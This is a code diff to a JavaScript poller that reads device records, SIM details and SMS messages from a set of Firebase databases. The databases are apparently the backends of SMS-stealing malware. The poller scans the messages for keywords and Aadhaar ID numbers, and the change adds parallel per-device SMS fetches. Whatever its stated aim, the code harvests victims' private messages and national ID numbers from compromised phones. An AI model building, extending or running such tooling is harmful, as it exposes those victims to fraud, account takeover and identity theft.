@@ -364,25 +364,34 @@ function parseSms(dsms, schema) {
   return { actStr, foundKws: [...foundKws], foundAadhars: [...foundAadhars], maxTs };
 }
 
+// ── Schemas that need per-device SMS fetch (not inline in main endpoint) ──────
+// mirrors DA1.py: schemas 2,3,4,5,6 fetch SMS separately per device
+const NEEDS_PER_DEVICE_SMS = new Set([2, 3, 4, 5, 6]);
+
+function getSmsEndpoint(url, schema, did) {
+  if (schema === 2 || schema === 4 || schema === 5) return `${url}/messages/${did}.json`;
+  // schemas 3, 6 and fallback
+  return `${url}/user_sms/${did}.json`;
+}
+
 // ── Per-target Firebase poll ──────────────────────────────────────────────────
 async function pollTarget(target) {
   const { id, url, schema, isOld } = target;
-  const now = Date.now();
-  const STALE = 30 * 60 * 1000; // 30 min online threshold
+  const STALE_MS = 30 * 60 * 1000;
 
   try {
     // ── Determine main endpoint ──────────────────────────────────────────────
     let mainEP;
-    if (schema === 1)                              mainEP = `${url}/All_Users.json`;
-    else if (schema === 2 || schema === 4)         mainEP = `${url}/clients.json`;
-    else if (schema === 3)                         mainEP = `${url}/user_data.json`;
-    else if (schema === 5)                         mainEP = `${url}/devices.json`;
-    else if (schema === 6)                         mainEP = `${url}/data.json`;
-    else if (schema === '8a')                      mainEP = `${url}/omex.json`;
+    if (schema === 1)                               mainEP = `${url}/All_Users.json`;
+    else if (schema === 2 || schema === 4)          mainEP = `${url}/clients.json`;
+    else if (schema === 3)                          mainEP = `${url}/user_data.json`;
+    else if (schema === 5)                          mainEP = `${url}/devices.json`;
+    else if (schema === 6)                          mainEP = `${url}/data.json`;
+    else if (schema === '8a')                       mainEP = `${url}/omex.json`;
     else if (['8b',9,10,11,14,15].includes(schema)) mainEP = `${url}/.json`;
-    else if (schema === 12)                        mainEP = `${url}/devices.json`;
-    else if (schema === 13)                        mainEP = `${url}/admin.json`;
-    else                                           mainEP = `${url}/All_Users.json`;
+    else if (schema === 12)                         mainEP = `${url}/devices.json`;
+    else if (schema === 13)                         mainEP = `${url}/admin.json`;
+    else                                            mainEP = `${url}/All_Users.json`;
 
     const data = await fbFetch(mainEP);
     if (!data) return;
@@ -395,9 +404,9 @@ async function pollTarget(target) {
       allSms  = data?.Data?.Sms        || {};
       allSims = data?.Data?.SimINFO    || {};
     } else if (schema === '8a') {
-      rawDevs = data?.All_User?.Info   || {};
-      allSms  = data?.All_User?.Sms    || {};
-      allSims = data?.All_User?.SimINFO|| {};
+      rawDevs = data?.All_User?.Info    || {};
+      allSms  = data?.All_User?.Sms     || {};
+      allSims = data?.All_User?.SimINFO || {};
     } else if (schema === '8b') {
       rawDevs = data?.omex?.All_User?.Info    || {};
       allSms  = data?.omex?.All_User?.Sms     || {};
@@ -428,6 +437,18 @@ async function pollTarget(target) {
       rawDevs = (data && typeof data === 'object') ? data : {};
     }
 
+    // ── For schemas that store SMS separately: fetch per-device SMS in parallel
+    if (NEEDS_PER_DEVICE_SMS.has(schema)) {
+      const dids = Object.keys(rawDevs);
+      const results = await Promise.allSettled(
+        dids.map(did => fbFetch(getSmsEndpoint(url, schema, did)).catch(() => null))
+      );
+      for (let i = 0; i < dids.length; i++) {
+        const val = results[i].status === 'fulfilled' ? results[i].value : null;
+        allSms[dids[i]] = val || {};
+      }
+    }
+
     // ── Process each device ──────────────────────────────────────────────────
     for (const [did, dinfo] of Object.entries(rawDevs)) {
       if (!dinfo || typeof dinfo !== 'object') continue;
@@ -444,7 +465,6 @@ async function pollTarget(target) {
       if (schema === 13) dsms = dinfo.receivedSms || {};
 
       const { actStr, foundKws, foundAadhars, maxTs } = parseSms(dsms, schema);
-      const STALE_MS = 30 * 60 * 1000;
 
       // ── Extract fields per schema (mirrors DA1.py exactly) ────────────────
       let s1 = 'N/A', s2 = 'N/A', bat = 'N/A', brand = 'Unknown', isOn = false;
